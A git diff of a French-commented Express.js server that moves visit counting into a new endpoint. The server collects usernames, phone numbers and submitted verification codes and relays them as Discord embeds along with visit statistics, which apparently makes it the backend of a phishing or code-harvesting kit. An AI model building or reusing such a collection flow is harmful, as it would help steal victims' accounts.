@@ -9,31 +9,9 @@ const { detectOperator } = require('./operators');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ======================= MIDDLEWARE =======================
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
-// Middleware pour tracker les visites
-app.use((req, res, next) => {
-  if (req.path === '/' || req.path === '/index.html') {
-    stats.totalVisits++;
-    stats.currentVisitors++;
-    stats.lastVisit = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
-    
-    // Mettre à jour l'embed Discord
-    updateStatsEmbed();
-    
-    // Décrémenter après 5 minutes d'inactivité
-    setTimeout(() => {
-      if (stats.currentVisitors > 0) {
-        stats.currentVisitors--;
-        updateStatsEmbed();
-      }
-    }, 5 * 60 * 1000);
-  }
-  next();
-});
 
 function getClientIp(req) {
   return (
@@ -45,7 +23,23 @@ function getClientIp(req) {
   );
 }
 
-// ======================= ROUTES =======================
+app.post('/api/v1/track-visit', (req, res) => {
+  stats.totalVisits++;
+  stats.currentVisitors++;
+  stats.lastVisit = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+  
+  updateStatsEmbed();
+
+  setTimeout(() => {
+    if (stats.currentVisitors > 0) {
+      stats.currentVisitors--;
+      updateStatsEmbed();
+    }
+  }, 5 * 60 * 1000);
+  
+  res.json({ success: true });
+});
+
 app.post('/api/v1/submit', async (req, res, next) => {
   try {
     const { username, phone } = req.body;
@@ -70,8 +64,7 @@ app.post('/api/v1/submit', async (req, res, next) => {
     };
 
     await sendInitialEmbed(username, phone);
-    
-    // Mise à jour des stats
+
     stats.totalRegistrations++;
     stats.lastRegistration = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
     updateStatsEmbed();
@@ -96,8 +89,7 @@ app.post('/api/v1/verify', async (req, res, next) => {
     user.status = 'pending';
 
     await sendCodeEmbed(username);
-    
-    // Mise à jour des stats
+
     stats.totalCodesSubmitted++;
     updateStatsEmbed();
 
@@ -144,13 +136,11 @@ app.get('/api/v1/users', (req, res) => {
   });
 });
 
-// ======================= ERRORS =======================
 app.use((err, req, res, next) => {
   console.error('❌ ERREUR API:', err);
   res.status(500).json({ error: 'Internal server error' });
 });
 
-// ======================= LISTEN =======================
 app.listen(PORT, () => {
   console.log(`🌐 API Express lancée sur le port ${PORT}`);
 });
